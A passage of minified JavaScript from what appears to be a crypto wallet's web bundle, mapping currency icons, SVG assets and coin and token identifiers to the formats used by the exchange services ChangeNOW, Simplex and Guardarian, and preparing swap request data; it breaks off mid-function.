            "icon-sls": "icon-currency_icon-sls_Y67Qk",
            "icon-sngls": "icon-currency_icon-sngls_Teogp",
            "icon-snrg": "icon-currency_icon-snrg_3gaVI",
            "icon-snt": "icon-currency_icon-snt_2GFqh",
            "icon-start": "icon-currency_icon-start_17oFQ",
            "icon-steem": "icon-currency_icon-steem_fXKEH",
            "icon-storj": "icon-currency_icon-storj_2k58h",
            "icon-str": "icon-currency_icon-str_2S2hp",
            "icon-strat": "icon-currency_icon-strat_1skxX",
            "icon-swift": "icon-currency_icon-swift_3H0TR",
            "icon-swt": "icon-currency_icon-swt_3yKux",
            "icon-sync": "icon-currency_icon-sync_2W1rm",
            "icon-sys": "icon-currency_icon-sys_uyZR4",
            "icon-time": "icon-currency_icon-time_3Lpj-",
            "icon-tkn": "icon-currency_icon-tkn_1UJiQ",
            "icon-trig": "icon-currency_icon-trig_1Dl6-",
            "icon-trst": "icon-currency_icon-trst_1rhIE",
            "icon-trx": "icon-currency_icon-trx__Ey8A",
            "icon-tx": "icon-currency_icon-tx_1kc6S",
            "icon-ubq": "icon-currency_icon-ubq_5ZI0o",
            "icon-unity": "icon-currency_icon-unity_1eeJL",
            "icon-usdt": "icon-currency_icon-usdt_2gTg9",
            "icon-ven": "icon-currency_icon-ven_PREia",
            "icon-vior": "icon-currency_icon-vior_1W0iP",
            "icon-vnl": "icon-currency_icon-vnl_tkw8S",
            "icon-vpn": "icon-currency_icon-vpn_3c0w1",
            "icon-vrc": "icon-currency_icon-vrc_zc4sg",
            "icon-vtc": "icon-currency_icon-vtc_jKnPJ",
            "icon-waves": "icon-currency_icon-waves_2PIRR",
            "icon-wings": "icon-currency_icon-wings_3erPw",
            "icon-xai": "icon-currency_icon-xai_17Q2i",
            "icon-xaur": "icon-currency_icon-xaur_3YYAU",
            "icon-xbs": "icon-currency_icon-xbs_2Y_ao",
            "icon-xcp": "icon-currency_icon-xcp_1Dt4b",
            "icon-xdn": "icon-currency_icon-xdn_3k3d8",
            "icon-xem": "icon-currency_icon-xem_2jAZo",
            "icon-xmr": "icon-currency_icon-xmr_2DBqJ",
            "icon-xmr-testnet": "icon-currency_icon-xmr-testnet_laR-w",
            "icon-xpm": "icon-currency_icon-xpm_1kFBt",
            "icon-xrp": "icon-currency_icon-xrp_3TZwl",
            "icon-xtz": "icon-currency_icon-xtz_2Hs4B",
            "icon-xvg": "icon-currency_icon-xvg_hr8qs",
            "icon-xzc": "icon-currency_icon-xzc_1o8E8",
            "icon-ybc": "icon-currency_icon-ybc_28FBF",
            "icon-zec": "icon-currency_icon-zec_2zbm5",
            "icon-zec-testnet": "icon-currency_icon-zec-testnet_2_8yV",
            "icon-zeit": "icon-currency_icon-zeit_2ieGY",
            "icon-zrx": "icon-currency_icon-zrx_jvN9z",
            icon: "icon-currency_icon_GAJBo",
            localWrapper: "icon-currency_localWrapper_i4yFv",
            smallWrapper: "icon-currency_smallWrapper_322qM",
            mediumWrapper: "icon-currency_mediumWrapper_1wzDR",
            empty: "icon-currency_empty_2adXa",
            unknown: "icon-currency_unknown_SawSV",
            isDisabled: "icon-currency_isDisabled_35rF2",
            "icon-xaut": "icon-currency_icon-xaut_11Q72",
            "icon-ethop": "icon-currency_icon-ethop_3WcdG",
            "icon-etharb": "icon-currency_icon-etharb_S5tcS",
            localIcon: "icon-currency_localIcon_2I8CC",
            smallLocalIcon: "icon-currency_smallLocalIcon_3gQh2",
            mediumLocalIcon: "icon-currency_mediumLocalIcon_un18x",
            "local-icon-hbar": "icon-currency_local-icon-hbar_2rjXA",
            "local-icon-leash": "icon-currency_local-icon-leash_vbmtW",
            "local-icon-rari": "icon-currency_local-icon-rari_RMkm1",
            "local-icon-srx": "icon-currency_local-icon-srx_1g072",
            "local-icon-elm": "icon-currency_local-icon-elm_14sNz",
            "local-icon-btt": "icon-currency_local-icon-btt_1h5D2",
            "local-icon-pre": "icon-currency_local-icon-pre_fTUK9",
            "local-icon-cake": "icon-currency_local-icon-cake_17Ate",
            "local-icon-safemoon": "icon-currency_local-icon-safemoon_200u7",
            "local-icon-axs": "icon-currency_local-icon-axs_3QQ4K",
            "local-icon-aws": "icon-currency_local-icon-aws_Znby0",
            "local-icon-awg": "icon-currency_local-icon-awg_2p_Rw",
            "local-icon-omg": "icon-currency_local-icon-omg_PpFxW",
            "local-icon-win": "icon-currency_local-icon-win_3lGf-",
            "local-icon-inj": "icon-currency_local-icon-inj_-Z1Eo",
            "local-icon-sanshu": "icon-currency_local-icon-sanshu_3vu81",
            "local-icon-grd": "icon-currency_local-icon-grd_-KDZJ",
            "local-icon-hoge": "icon-currency_local-icon-hoge_3xDnI",
            "local-icon-xec": "icon-currency_local-icon-xec_1QkYd",
            "local-icon-pli": "icon-currency_local-icon-pli_3n2Kc",
            "local-icon-arnx": "icon-currency_local-icon-arnx_bsHij",
            "local-icon-uni": "icon-currency_local-icon-uni_euiPH",
            "local-icon-stxem": "icon-currency_local-icon-stxem_20toc",
            "local-icon-shib": "icon-currency_local-icon-shib_2s7ps",
            "local-icon-jst": "icon-currency_local-icon-jst_1t6ap",
            "local-icon-kishu": "icon-currency_local-icon-kishu_1D-U3",
            "local-icon-usdc": "icon-currency_local-icon-usdc_3KjOK",
            "local-icon-nano": "icon-currency_local-icon-nano_2MHuV",
            fontIcon: "icon-currency_fontIcon_sM3hm",
            "fontIcon-clo": "icon-currency_fontIcon-clo_1hUwX",
            "fontIcon-atom": "icon-currency_fontIcon-atom_gYMqH",
            "fontIcon-bsv": "icon-currency_fontIcon-bsv_3Re8I",
            "fontIcon-vet": "icon-currency_fontIcon-vet_2PRjU",
            "fontIcon-ltc": "icon-currency_fontIcon-ltc_3yDwf",
            "fontIcon-lsk": "icon-currency_fontIcon-lsk_dq5jn",
            "local-icon-zil-testnet": "icon-currency_local-icon-zil-testnet_2vfYR",
            "local-icon-hbar-testnet": "icon-currency_local-icon-hbar-testnet_392n1",
            "local-icon-mana": "icon-currency_local-icon-mana_1OMqY",
            "local-icon-avax": "icon-currency_local-icon-avax_3Hf0X",
            "local-icon-meld": "icon-currency_local-icon-meld_2R2Vk",
            "local-icon-ksm": "icon-currency_local-icon-ksm_4Qola",
            "local-icon-luna": "icon-currency_local-icon-luna_2yKQG",
            "local-icon-wam": "icon-currency_local-icon-wam_flNx5",
            "local-icon-hmstr": "icon-currency_local-icon-hmstr_3Vlfl",
            "local-icon-pit": "icon-currency_local-icon-pit_3cNae",
            smallContent: "icon-currency_smallContent_33RKA",
            mediumContent: "icon-currency_mediumContent_3CpzQ"
        }
          , va = a.p + "8dd835053c550f75a030b129158a0938.svg"
          , _a = a.p + "e5472c630ca2cb8ea341852a7e9d6ea2.svg"
          , wa = a.p + "ab78fab7c7136702381e1bdc8ff60957.svg"
          , ba = a.p + "90b0021a7ca77d5bdd27d50d57c8455c.svg"
          , ka = a.p + "a742b4f01cb9c7a3a06b1adab53e8922.svg"
          , Sa = a.p + "ecdc5c56890efecb6fc5c884882a8456.svg"
          , Ca = a.p + "941a0bfb98fbe926dbb6b87664d87c5a.svg"
          , Na = a.p + "21e2cd4e7cb5e2bf710a3c80463a17c7.svg"
          , Ta = a.p + "38cbf74fa1b434f9180d8fc831f4b2b2.svg"
          , Aa = a.p + "d36537c101eed942e6639d9af89353a1.svg"
          , xa = a.p + "95b87b9be4c0ba66f745bb95d66d061c.svg"
          , Ia = a.p + "4df54826662597b659717056e6a76bb6.svg"
          , Pa = a.p + "254833164e0155d6aeeb470e04db8dad.svg"
          , La = a.p + "09169c487c494522c9348c39f01c1622.svg"
          , Fa = a.p + "6734dae577d5c15d9b274c67593471b8.svg"
          , Wa = a.p + "408e842e5ee59cdcba4eeff7a11ecb3e.svg"
          , Ra = a.p + "f4c201903087a207f6a559965d36bafc.svg"
          , Ba = a.p + "5a3c2fbbc5e9a52b2acc029338a7006a.svg"
          , Oa = a.p + "aac24e9263f75c1c18ab62746ea52888.svg"
          , Da = a.p + "cd3bbc22069ab0e48656277b43202f75.svg"
          , Ma = a.p + "605da423c78bbb831d83b95089457271.svg"
          , Ua = a.p + "b41930557b3669c9f3652ad1477c087b.svg"
          , Ga = a.p + "a3fda612c11adaa9a1e61a5da5d4e35e.svg"
          , Va = a.p + "09ed73fa4408a4f10a11ad0d3be04d8a.svg"
          , Ka = a.p + "8f362eb60e222ddb01540ffcd62b9506.svg"
          , Ha = a.p + "e78f16fdd714068caa2f2147513e74e1.svg"
          , za = a.p + "0901e1f5a8521964b1ac31833fcb9c8e.svg"
          , ja = a.p + "2166d87fafaa9d53e8556b60be1c2592.svg"
          , $a = a.p + "5ff2909d91e67d1b60ea4cf9c278c756.svg"
          , Za = a.p + "015b04ee94f32665d7373f9d2721337b.svg"
          , Ya = a.p + "70a80675ee9f9126bdffa097ecaabdf0.svg"
          , qa = a.p + "67fb8a469014e37e9b41ba1ef21204e6.svg"
          , Xa = a.p + "eea4ba3f748e2f352babcfc47a7c5817.svg"
          , Qa = a.p + "d8c61230b25fa2075462dce262c6dd2a.svg"
          , Ja = a.p + "9018565d27f1450dbaa28dacc1ba4827.svg"
          , en = a.p + "fb6ec628db654533eebb6668ccba657c.svg"
          , tn = a.p + "f6bf82a806187e041f3d541bbfa060f8.svg"
          , an = a.p + "26a39327284a3546fe7cf64963214546.svg"
          , nn = a.p + "41b3acfaf8a21a515c7acda39ec8b78f.svg"
          , rn = a.p + "14c98ffb7bc145c1e270880b7e73dfc6.svg"
          , ln = a.p + "43e1db170c0cfb070529e193e4c82aac.svg"
          , sn = a.p + "ee7ddc91aad27ddd83f901ca7e06f05c.svg"
          , on = a.p + "fb6152f29130ca422beaddc96a6191c6.svg"
          , cn = a.p + "3202f672874bfa83e1efb515c6b4f2a6.svg"
          , un = a.p + "50fb38f56eec94b6f6f6bea0f4ace327.svg"
          , dn = a.p + "006a17575362ad16ca3bac4444ebea04.svg"
          , mn = a.p + "9ede39bd6e4eaab71c8106f5b2b965fc.svg"
          , pn = a.p + "d4878e162c2d6b84d598de9b194124a0.svg"
          , fn = a.p + "5e62ecf089247c09c6addb871dec5c7a.svg"
          , En = a.p + "03c313c1597b4a63fccad19257e2e896.svg"
          , hn = a.p + "79e53506d6dcb876eb7ec7850633be96.svg"
          , gn = a.p + "275dfe9c384b83e2670dce9961867701.svg"
          , yn = a.p + "cfbe0b0d837082d0597bd1d02b285343.svg"
          , vn = a.p + "722519ae2e02118a0032497b1fa31887.svg"
          , _n = a.p + "140cad3536b2d99da5c701fe13112e62.svg"
          , wn = a.p + "0b3f95423b9302998d6fc3128babf24a.svg"
          , bn = a.p + "f72555dbd98cea181f50c8524f2ed476.svg"
          , kn = a.p + "10577a27ff7e75a6f816ac5149c8df73.svg"
          , Sn = a.p + "6d1688e2436d1f3874d656e5bfe5c659.svg"
          , Cn = a.p + "eab2e0ff7fccafcf74c44d3bff60dfda.svg"
          , Nn = a.p + "7af9da91a141d62270ef22828d2af853.svg"
          , Tn = a.p + "4bd86ca88731808cf8b604319898b6c6.svg"
          , An = a.p + "907fc6c46cf116a6d44b3ab02543588c.svg"
          , xn = a.p + "d594bf7dd60fa70bf2ef8cc0a3bd3df9.svg"
          , In = a.p + "3c538205bd28944ad4f92eec49996790.svg"
          , Pn = a.p + "7aa4cdeb02604377bae2ce1430ee28bc.svg"
          , Ln = a.p + "6b745a743bd166e8f313ee50eff2c7df.svg"
          , Fn = a.p + "4c048ae746ef426b40afdadac198acea.svg"
          , Wn = a.p + "60eaa5653d0e26d273f5ce63482abec3.svg"
          , Rn = a.p + "a3f3731d51c2cd33df24e55af1f23844.svg"
          , Bn = a.p + "c6255dbef76752072b9fda0e4befa81c.svg"
          , On = a.p + "8a5c71bbdafbc3289c121fc70c285653.svg"
          , Dn = a.p + "16cf052591af5db073aca3050cfe8276.svg"
          , Mn = undefined
          , Un = undefined
          , Gn = undefined
          , Vn = undefined
          , Kn = undefined
          , Hn = undefined
          , zn = undefined
          , jn = {
            bsc: Qa,
            bchc: va,
            paxg: _a,
            pgold: wa,
            one: ba,
            lrc: ka,
            solve: Sa,
            okb: Ca,
            rune: Na,
            comp: Ta,
            xdc: Aa,
            dot: xa,
            rdd: Ia,
            algo: Pa,
            yfi: La,
            uma: Fa,
            ht: Wa,
            leo: Ra,
            snx: Ba,
            cro: Oa,
            aave: Da,
            ctsi: Ma,
            ampl: Ua,
            keep: Ga,
            veri: Va,
            lend: Ka,
            firo: Ha,
            geth: za,
            near: ja,
            wbtc: $a,
            hbar: Za,
            awx: Ya,
            omg: qa,
            btcv: Xa,
            amp: Ja,
            win: en,
            usdc: tn,
            ftt: an,
            inj: nn,
            sanshu: rn,
            grd: ln,
            hoge: sn,
            awg: on,
            aws: cn,
            shib: un,
            axs: dn,
            safemoon: mn,
            cake: pn,
            "2lc": fn,
            pre: En,
            arnx: hn,
            dao: gn,
            btt: yn,
            jst: vn,
            kishu: _n,
            matic: wn,
            elm: bn,
            stxem: kn,
            uni: Sn,
            rari: Cn,
            pli: Nn,
            srx: Tn,
            leash: An,
            "hbar-testnet": xn,
            "zil-testnet": In,
            pit: Pn,
            ont: Ln,
            ong: Fn,
            mana: Wn,
            avax: Rn,
            xno: Bn,
            ksm: On,
            luna: a.p + "c57c688a41416f594f561e435011b44d.svg",
            sol: Dn,
            wam: a.p + "5d2d399d78bbc127bb26f80bbb22e187.svg",
            egld: a.p + "45189c7f87743973064824bc8b520b7b.svg",
            apt: a.p + "c00e38ad775b33c0045ae4d88771c0c5.svg",
            meld: a.p + "441d9cc671609e363211ff0d71c4a2ac.svg",
            xec: a.p + "564a9fc50327341f6f4cc59a1f3fdde8.svg",
            hmstr: a.p + "e06c23b1054651c8050acf9df5a60f25.svg"
        }
          , $n = "@icons"
          , Zn = "fletcher-icons"
          , Yn = "@icons/SET_FLETCHER_ICONS"
          , qn = "@icons/FETCH_FLETCHER_ICONS"
          , fletcherIconsStateSelector = e => e[Zn]
          , Xn = (0,
        _t.P1)(fletcherIconsStateSelector, (e => {
            var t;
            return null !== (t = e.fletcherIcons) && void 0 !== t ? t : []
        }
        ))
          , useFletcherIcon = e => {
            const t = (0,
            $.v9)(Xn)
              , a = (0,
            O.useMemo)(( () => t.find((t => t.currency === e))), [t, e])
              , n = undefined;
            return {
                fletcherSvg: (0,
                O.useMemo)(( () => {
                    const e = null == a ? void 0 : a.icon;
                    if (!e)
                        return "";
                    const t = undefined;
                    return `data:image/svg+xml;base64,${window.btoa(e)}`
                }
                ), [null == a ? void 0 : a.icon]),
                fletcherWidth: (null == a ? void 0 : a.iconWidth) && a.iconWidth + "px" || "",
                fletcherHeight: (null == a ? void 0 : a.iconHeight) && a.iconHeight + "px" || "",
                fletcherColor: (null == a ? void 0 : a.iconColor) || ""
            }
        }
        ;
        var Qn = a(10956)
          , Jn = a.n(Qn);
        const er = {
            name: "bnb-bsc",
            currency: "bsc",
            family: "bsc",
            title: "Binance Smart Chain",
            precision: 18
        }
          , tr = {
            name: "changenow",
            data: {
                ...er,
                family: "bsc",
                currency: "bnb"
            }
        }
          , ar = {
            name: "simplex",
            data: {
                ...er,
                family: "bsc",
                currency: "bnb"
            }
        }
          , nr = {
            name: "guardarian",
            data: {
                ...er,
                family: "bsc",
                currency: "bnb"
            }
        }
          , rr = {
            ...er,
            services: new Map([[tr.name, tr.data], [ar.name, ar.data], [nr.name, nr.data]])
        }
          , lr = {
            name: "ada-shelley",
            currency: "ada-shelley",
            family: "ada-shelley",
            title: "Cardano Shelley",
            precision: 6
        }
          , sr = {
            name: "changenow",
            data: {
                ...lr,
                family: "ada",
                currency: "ada"
            }
        }
          , ir = {
            name: "guardarian",
            data: {
                ...lr,
                family: "ada",
                currency: "ada"
            }
        }
          , or = {
            name: "simplex",
            data: {
                ...lr,
                family: "ada",
                currency: "ada"
            }
        }
          , cr = {
            ...lr,
            services: new Map([[sr.name, sr.data], [or.name, or.data], [ir.name, ir.data]])
        }
          , ur = {
            name: "avax",
            currency: "avax",
            family: "avax",
            title: "Avalanche"
        }
          , dr = {
            name: "changenow",
            data: {
                ...ur,
                family: "cchain",
                currency: "avax"
            }
        }
          , mr = {
            name: "guardarian",
            data: {
                ...ur,
                family: "cchain",
                currency: "avax"
            }
        }
          , pr = {
            name: "simplex",
            data: {
                ...ur,
                family: "avax",
                currency: "avax-c"
            }
        }
          , fr = {
            ...ur,
            services: new Map([[dr.name, dr.data], [pr.name, pr.data], [mr.name, mr.data]])
        }
          , Er = {
            name: "trx",
            currency: "trx",
            family: "trx",
            title: "TRON"
        }
          , hr = {
            name: "mnemonic",
            data: {
                ...Er,
                handlePrivateKey: e => {
                    let {privateKey: t} = e;
                    if ("string" == typeof t)
                        return t.toUpperCase();
                    if (null != t && t.privateKey) {
                        var a;
                        return null == t || null === (a = t.privateKey) || void 0 === a ? void 0 : a.toUpperCase()
                    }
                    throw Error("TRX handlePrivateKey")
                }
            }
        }
          , gr = {
            ...Er,
            services: new Map([[hr.name, hr.data]])
        }
          , yr = {
            name: "xno",
            currency: "xno",
            family: "xno",
            title: "Xno"
        }
          , vr = {
            name: "changenow",
            data: {
                ...yr,
                family: "nano",
                currency: "xno"
            }
        }
          , _r = {
            name: "guardarian",
            data: {
                ...yr,
                family: "nano",
                currency: "xno"
            }
        }
          , wr = {
            ...yr,
            services: new Map([[_r.name, _r.data], [vr.name, vr.data]])
        }
          , br = {
            name: "ethop",
            currency: "ethop",
            family: "ethop",
            title: "ETH Optimism"
        }
          , kr = {
            name: "changenow",
            data: {
                ...br,
                family: "op",
                currency: "eth"
            }
        }
          , Sr = {
            name: "guardarian",
            data: {
                ...br,
                family: "op",
                currency: "eth"
            }
        }
          , Cr = {
            name: "simplex",
            data: {
                ...br,
                family: "eth",
                currency: "eth-optimism"
            }
        }
          , Nr = {
            ...br,
            services: new Map([[kr.name, kr.data], [Cr.name, Cr.data], [Sr.name, Sr.data]])
        }
          , Tr = {
            name: "etharb",
            currency: "etharb",
            family: "etharb",
            title: "ETH Arbitrum"
        }
          , Ar = {
            name: "changenow",
            data: {
                ...Tr,
                family: "arbitrum",
                currency: "eth"
            }
        }
          , xr = {
            name: "simplex",
            data: {
                ...Tr,
                family: "arbitrum",
                currency: "eth"
            }
        }
          , Ir = {
            name: "guardarian",
            data: {
                ...Tr,
                family: "arbitrum",
                currency: "eth"
            }
        }
          , Pr = {
            ...Tr,
            services: new Map([[Ar.name, Ar.data], [xr.name, xr.data], [Ir.name, Ir.data]])
        }
          , Lr = {
            [cr.name]: cr,
            [rr.name]: rr,
            [fr.name]: fr,
            [gr.name]: gr,
            [wr.name]: wr,
            [Nr.name]: Nr,
            [Pr.name]: Pr
        }
          , Fr = {
            name: "bnb-ava-645",
            currency: "ava-645",
            family: "bnb",
            smartContract: "ava-645",
            title: "AVA"
        }
          , Wr = {
            name: "changenow",
            data: {
                family: Fr.family,
                currency: "ava"
            }
        }
          , Rr = {
            ...Fr,
            services: new Map([[Wr.name, Wr.data]])
        }
          , Br = {
            name: "trx-usdt",
            currency: "usdt-trx20",
            family: "trx",
            smartContract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            title: "TetherUS"
        }
          , Or = {
            name: "changenow",
            data: {
                family: Br.family,
                currency: "usdt"
            }
        }
          , Dr = {
            name: "simplex",
            data: {
                family: Br.family,
                currency: "usdt-trc20"
            }
        }
          , Mr = {
            ...Br,
            services: new Map([[Or.name, Or.data], [Dr.name, Dr.data]])
        }
          , Ur = {
            name: "eth-rfuel",
            currency: "rfuel-erc20",
            family: "eth",
            smartContract: "0xaf9f549774ecedbd0966c52f250acc548d3f36e5",
            title: "Rio Fuel Token"
        }
          , Gr = {
            name: "simplex",
            data: {
                family: Ur.family,
                currency: "rfuel"
            }
        }
          , Vr = {
            ...Ur,
            services: new Map([[Gr.name, Gr.data]])
        }
          , Kr = {
            name: "eth-uos",
            currency: "uos-erc20",
            family: "eth",
            smartContract: "0xd13c7342e1ef687c5ad21b27c2b65d772cab5c8c",
            title: "Ultra"
        }
          , Hr = {
            name: "changenow",
            data: {
                family: Kr.family,
                currency: "uos-erc20"
            }
        }
          , zr = {
            name: "simplex",
            data: {
                family: Kr.family,
                currency: "uos-erc20"
            }
        }
          , jr = {
            ...Kr,
            services: new Map([[Hr.name, Hr.data], [zr.name, zr.data]])
        }
          , $r = {
            name: "eth-matic",
            currency: "matic-erc20",
            family: "eth",
            smartContract: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",
            title: "Matic"
        }
          , Zr = {
            name: "simplex",
            data: {
                family: $r.family,
                currency: "matic-erc20"
            }
        }
          , Yr = {
            ...$r,
            services: new Map([[Zr.name, Zr.data]])
        }
          , qr = {
            name: "eth-axs",
            currency: "axs-erc20",
            family: "eth",
            smartContract: "0xbb0e17ef65f82ab018d8edd776e8dd940327b28b",
            title: "Axie Infinity Shard"
        }
          , Xr = {
            name: "simplex",
            data: {
                family: qr.family,
                currency: "axs-erc20"
            }
        }
          , Qr = {
            ...qr,
            services: new Map([[Xr.name, Xr.data]])
        }
          , Jr = {
            name: "bsc-usdc",
            currency: "usdc",
            family: "bsc",
            smartContract: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
            title: "USDC"
        }
          , el = {
            name: "simplex",
            data: {
                family: Jr.family,
                currency: "usdc-sc"
            }
        }
          , tl = {
            ...Jr,
            services: new Map([[el.name, el.data]])
        }
          , al = {
            name: "bsc-busd",
            currency: "busd",
            family: "bsc",
            smartContract: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
            title: "Binance USD"
        }
          , nl = {
            name: "simplex",
            data: {
                family: al.family,
                currency: "busd-sc"
            }
        }
          , rl = {
            ...al,
            services: new Map([[nl.name, nl.data]])
        }
          , ll = {
            name: "eth-gmt",
            currency: "gmt-erc20",
            family: "eth",
            smartContract: "0x7Ddc52c4De30e94Be3A6A0A2b259b2850f421989",
            title: "GMT-ERC20"
        }
          , sl = {
            name: "simplex",
            data: {
                family: ll.family,
                currency: "gmt-erc20"
            }
        }
          , il = {
            ...ll,
            services: new Map([[sl.name, sl.data]])
        }
          , ol = {
            name: "eth-satt",
            currency: "satt",
            family: "eth",
            smartContract: "0xDF49C9F599A0A9049D97CFF34D0C30E468987389",
            title: "SaTT"
        }
          , cl = {
            name: "simplex",
            data: {
                family: ol.family,
                currency: "satt-erc20"
            }
        }
          , ul = {
            ...ol,
            services: new Map([[cl.name, cl.data]])
        }
          , dl = {
            name: "eth-cro",
            currency: "cro-erc20",
            family: "eth",
            smartContract: "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b",
            title: "CRO-ERC20"
        }
          , ml = {
            name: "simplex",
            data: {
                family: dl.family,
                currency: "cro-erc20"
            }
        }
          , pl = {
            ...dl,
            services: new Map([[ml.name, ml.data]])
        }
          , fl = undefined
          , El = {
            name: "guardarian",
            data: {
                family: "bnb",
                currency: "now"
            }
        }
          , hl = {
            ...{
                name: "now-bnb",
                currency: "now-e68",
                family: "bnb",
                title: "NOW-BNB"
            },
            services: new Map([[El.name, El.data]])
        }
          , gl = {
            name: "bnb-tusd",
            currency: "tusd",
            family: "bnb",
            smartContract: "tusdb-888",
            title: "TrueUSD"
        }
          , yl = {
            name: "changenow",
            data: {
                family: gl.family,
                currency: "tusd-bep2"
            }
        }
          , vl = {
            ...gl,
            services: new Map([[yl.name, yl.data]])
        }
          , _l = {
            name: "usdt-arbitrum",
            currency: "usdt",
            family: "etharb",
            smartContract: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
            title: "Tether"
        }
          , wl = {
            name: "simplex",
            data: {
                family: _l.family,
                currency: "usdt-arbitrum"
            }
        }
          , bl = {
            ..._l,
            services: new Map([[wl.name, wl.data]])
        }
          , kl = {
            name: "usdc-arbitrum",
            currency: "usdc",
            family: "etharb",
            smartContract: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8",
            title: "Tether"
        }
          , Sl = {
            name: "simplex",
            data: {
                family: kl.family,
                currency: "usdc-arbitrum"
            }
        }
          , Cl = {
            name: "changenow",
            data: {
                ...kl,
                family: "arbitrum",
                currency: "usdc"
            }
        }
          , Nl = {
            ...kl,
            services: new Map([[Sl.name, Sl.data], [Cl.name, Cl.data]])
        }
          , Tl = {
            name: "usdt-optimism",
            currency: "usdc",
            family: "ethop",
            smartContract: "0x94b008aa00579c1307b0ef2c499ad98a8ce58e58",
            title: "Tether"
        }
          , Al = {
            name: "simplex",
            data: {
                family: Tl.family,
                currency: "usdt-optimism"
            }
        }
          , xl = {
            ...Tl,
            services: new Map([[Al.name, Al.data]])
        }
          , Il = {
            name: "trx-tusd",
            currency: "tusd",
            family: "trx",
            smartContract: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4",
            title: "TrueUSD"
        }
          , Pl = {
            name: "simplex",
            data: {
                family: Il.family,
                currency: "tusd-trc20"
            }
        }
          , Ll = {
            ...Il,
            services: new Map([[Pl.name, Pl.data]])
        }
          , Fl = {
            name: "sol-usdc",
            currency: "usdc",
            family: "sol",
            smartContract: "epjfwdd5aufqssqem2qn1xzybapc8g4weggkzwytdt1v",
            title: "USD Coin"
        }
          , Wl = {
            name: "simplex",
            data: {
                family: Fl.family,
                currency: "usdc-sol"
            }
        }
          , Rl = {
            ...Fl,
            services: new Map([[Wl.name, Wl.data]])
        }
          , Bl = {
            name: "trx-usdc",
            currency: "usdc",
            family: "trx",
            smartContract: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
            title: "USD Coin"
        }
          , Ol = {
            name: "simplex",
            data: {
                family: Bl.family,
                currency: "usdc-trc20"
            }
        }
          , Dl = {
            ...Bl,
            services: new Map([[Ol.name, Ol.data]])
        }
          , Ml = undefined
          , Ul = {
            tokens: {
                [jr.name]: jr,
                [Vr.name]: Vr,
                [Mr.name]: Mr,
                [Rr.name]: Rr,
                [Yr.name]: Yr,
                [Qr.name]: Qr,
                [tl.name]: tl,
                [rl.name]: rl,
                [il.name]: il,
                [ul.name]: ul,
                [pl.name]: pl,
                [hl.name]: hl,
                [vl.name]: vl,
                [bl.name]: bl,
                [Nl.name]: Nl,
                [xl.name]: xl,
                [Ll.name]: Ll,
                [Rl.name]: Rl,
                [Dl.name]: Dl
            },
            coins: Lr
        }
          , getName = e => {
            let {currency: t, family: a} = e;
            return t && a && a !== t ? `${a}-${t}` : t
        }
          , findThirdPartyServiceCoinData = (e, t) => {
            const {currency: a, name: n=getName(t), family: r=a} = t;
            if (n in Ul.coins && Ul.coins[n].services.has(e))
                return Ul.coins[n].services.get(e);
            const l = Object.values(Ul.coins).find((e => e.family === r && e.currency === a));
            return l && l.services.has(e) ? l.services.get(e) : t
        }
          , findThirdPartyServiceTokenData = (e, t) => {
            const {currency: a, family: n, name: r=getName(t), smartContract: l} = t;
            if (r in Ul.tokens)
                return Ul.tokens[r].services.has(e) ? Ul.tokens[r].services.get(e) : t;
            const s = Object.values(Ul.tokens);
            if (l) {
                const a = s.find((e => (null == e ? void 0 : e.smartContract) === l && (null == e ? void 0 : e.family) === n));
                return a && a.services.has(e) ? a.services.get(e) : t
            }
            const i = s.find((e => e.family === n && e.currency === a));
            if (i && i.services.has(e))
                return i.services.get(e);
            if (n) {
                const a = findThirdPartyServiceCoinData(e, {
                    currency: n,
                    family: n
                });
                return {
                    ...t,
                    family: a.family
                }
            }
            return t
        }
        ;
        function thirdPartyServiceData(e, t) {
            const {currency: a, family: n, smartContract: r} = t
              , l = undefined;
            return a !== n || !!r ? findThirdPartyServiceTokenData(e, t) : findThirdPartyServiceCoinData(e, t)
        }
        function fromThirdPartyService(e, t) {
            if ("changenow" === e) {
                if ("bnb" === t.fromCurrency && "bsc" === t.fromFamily) {
                    const {currency: e, family: a} = Ul.coins[`${t.fromCurrency}-${t.fromFamily}`];
                    return {
                        ...t,
                        fromCurrency: e,
                        fromFamily: a
                    }
                }
                if ("bnb" === t.toCurrency && "bsc" === t.toFamily) {
                    const {currency: e, family: a} = Ul.coins[`${t.toCurrency}-${t.toFamily}`];
                    return {
                        ...t,
                        toCurrency: e,
                        toFamily: a
                    }
                }
            }
            return t
        }
        const Gl = Jn()(thirdPartyServiceData, {
            cacheKey: e => {
                let[t,{currency: a, family: n, name: r, smartContract: l}] = e;
                return [t, a, n, r, l].filter(Boolean).join(",")
            }
        })
          , Vl = ["bsc"]
          , prepareDusterRequestData = (e, t) => ({
            fromAddress: t.addressFrom,
            payinAddress: e.addressDeposit,
            payoutAddress: t.address,
            amountIn: e.fromAmount.toString(),
            amountOut: e.toAmount.toString(),
            currencyFrom: e.fromCurrency,
            currencyTo: e.toCurrency,
            familyFrom: e.fromNetwork,
            familyTo: "",
            exchangeId: e.id,
            fee: t.fee,
            partner: t.partner
        })
          , prepareDataToFetchLimitsAndEstimate = (e, t) => {
            const {currency: a, family: n=e.currency} = Gl("changenow", {
                family: e.family || e.currency,
                currency: e.currency
            })
              , {currency: r, family: l=t.currency} = Gl("changenow", {
                family: t.family || t.currency,
                currency: t.currency
            })
              , s = Gl("changenow", {
                family: n,
                currency: a
            }).currency
              , i = Gl("changenow", {
                family: l,
                currency: r
            }).currency;
            return {
                fromCurrency: (0,
                be.xG)(s).toLowerCase(),
                toCurrency: (0,
                be.xG)(i).toLowerCase(),
                fromNetwork: Vl.includes(n.toLowerCase()) ? n.toLowerCase() : (0,
                be.xG)(n).toLowerCase(),
                toNetwork: Vl.includes(l.toLowerCase()) ? l.toLowerCase() : (0,
                be.xG)(l).toLowerCase()
            }
        }
          , checkIsTokenSupported = (e, t, a) => {
            if (null != e && e.smartContract && "eth" === (null == e ? void 0 : e.family)) {
                const t = undefined;
                if (!a.find((t => {
                    var a, n;
